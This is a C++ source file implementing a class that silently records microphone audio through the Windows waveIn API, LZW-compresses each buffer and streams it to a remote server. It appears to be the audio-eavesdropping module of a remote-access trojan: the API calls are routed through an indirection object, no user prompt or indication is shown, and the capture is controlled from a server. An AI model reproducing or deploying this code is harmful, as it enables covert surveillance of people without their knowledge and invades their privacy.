// MyAudioTrans.cpp: implementation of the CMyAudioTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyAudioTrans.h"
#include "Lzw.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyAudioTrans::CMyAudioTrans()
{
	pWareBuf = new LPWAVEHDR[256];
	for(int i = 0; i < 256; i++)
	{
		pWareBuf[i] = new WAVEHDR;
		m_gFunc.memset ( pWareBuf[i], 0, sizeof(WAVEHDR) );
		pWareBuf[i]->dwBufferLength = 4096;
		pWareBuf[i]->lpData = new char[4096];
	}
	nWareBufCount = 0;

	m_IsExitAudio = FALSE;
	m_IsInitAudio = FALSE;
}

CMyAudioTrans::~CMyAudioTrans()
{
	if(pWareBuf != NULL)
	{
		for(int i = 0; i < 256; i++)
		{
			delete [] pWareBuf[i]->lpData;
			delete pWareBuf[i];
		}
		delete [] pWareBuf;
	}
}

void CMyAudioTrans::StartWork(HWND hWnd)
{
	//连接到服务器
	if(!Create(WM_CONNECT_AUDIO, hWnd))
	{
		return;
	}

	m_WaveInfo.cbSize			= sizeof(WAVEFORMATEX);
	m_WaveInfo.nChannels		= 1;
	m_WaveInfo.wFormatTag		= WAVE_FORMAT_PCM;
	m_WaveInfo.wBitsPerSample	= 16;
	m_WaveInfo.nChannels		= 1;
	m_WaveInfo.nSamplesPerSec	= 22050;
	m_WaveInfo.nAvgBytesPerSec	= 44100;
	m_WaveInfo.nBlockAlign		= m_WaveInfo.nChannels * (m_WaveInfo.wBitsPerSample / 8);

	HWAVEIN m_hRecord = NULL;
	if(m_gFunc.waveInOpen(&m_hRecord, WAVE_MAPPER, &m_WaveInfo, (DWORD) OnCaptureAudio, (DWORD) this, CALLBACK_FUNCTION) != 0)
	{
		return;
	}

	for(int i = 0; i < 256; i ++)
	{
		if(m_gFunc.waveInPrepareHeader (m_hRecord, pWareBuf[i], sizeof(WAVEHDR)) != 0)
		{
			return;
		}

		if(m_gFunc.waveInAddBuffer (m_hRecord, pWareBuf[i], sizeof(WAVEHDR)) != 0)
		{
			return;
		}
	}

	if(m_gFunc.waveInStart(m_hRecord) != 0)
	{
		return;
	}

	MSG msg;
    while(m_gFunc.GetMessage(&msg, 0, 0, 0))
	{
		if(WM_CLOSE_CLIENT_THREAD == msg.message)
		{
			break;
		}
 	}
}

void CMyAudioTrans::GetAudioData(HWAVEIN m_hRecord, LPWAVEHDR lpWHdr)
{
	if(m_gFunc.waveInUnprepareHeader(m_hRecord, lpWHdr, sizeof(WAVEHDR)) != 0)
	{
		return;
	}

	if(!m_IsInitAudio)
	{
		m_IsInitAudio = TRUE;
		if(!SendData(&m_WaveInfo, sizeof(WAVEFORMATEX)) || !SendData(lpWHdr, sizeof(WAVEHDR)))
		{
			m_IsExitAudio = TRUE;
			m_gFunc.waveInStop(m_hRecord);
			m_gFunc.waveInClose(m_hRecord);
			while(!m_gFunc.PostThreadMessage(nThreadAudio, WM_CLOSE_CLIENT_THREAD, FALSE, FALSE))
			{
				m_gFunc.Sleep(10);
			}
			return;
		}
	}

	BYTE* pSrcData = new BYTE[lpWHdr->dwBufferLength * 2 + 65535];
	BYTE* pZipData = new BYTE[lpWHdr->dwBufferLength * 2 + 65535];
	m_gFunc.memset(pZipData, 0, lpWHdr->dwBufferLength * 2 + 65535);
	m_gFunc.memset(pSrcData, 0, lpWHdr->dwBufferLength * 2 + 65535);
	m_gFunc.memcpy(pSrcData, lpWHdr->lpData, lpWHdr->dwBytesRecorded);

	FCLzw lzw;
	DWORD nLen = lpWHdr->dwBytesRecorded;
	lzw.PcZip(pSrcData, pZipData, &nLen);

	if(!SendData(&nLen, sizeof(DWORD)) || !SendData(pZipData, nLen))
	{
		m_IsExitAudio = TRUE;
		delete [] pZipData;
		delete [] pSrcData;
		m_gFunc.waveInStop(m_hRecord);
		m_gFunc.waveInClose(m_hRecord);
		while(!m_gFunc.PostThreadMessage(nThreadAudio, WM_CLOSE_CLIENT_THREAD, FALSE, FALSE))
		{
			m_gFunc.Sleep(10);
		}
		return;
	}
	delete [] pZipData;
	delete [] pSrcData;

	//再加入缓冲
	if(m_gFunc.waveInPrepareHeader(m_hRecord, lpWHdr, sizeof(WAVEHDR)) != 0)
	{
		return;
	}
	m_gFunc.waveInAddBuffer(m_hRecord, lpWHdr, sizeof(WAVEHDR));
}

void CALLBACK CMyAudioTrans::OnCaptureAudio(HWAVEIN hwi, UINT uMsg, DWORD dwInstance, DWORD dwParam1, DWORD dwParam2)
{
	CMyAudioTrans* pThis = (CMyAudioTrans*) dwInstance;
	if(pThis != NULL && !pThis->m_IsExitAudio)
	{
		if(uMsg == MM_WIM_DATA)
		{
			pThis->GetAudioData(hwi, (WAVEHDR*) dwParam1);
		}
	}
}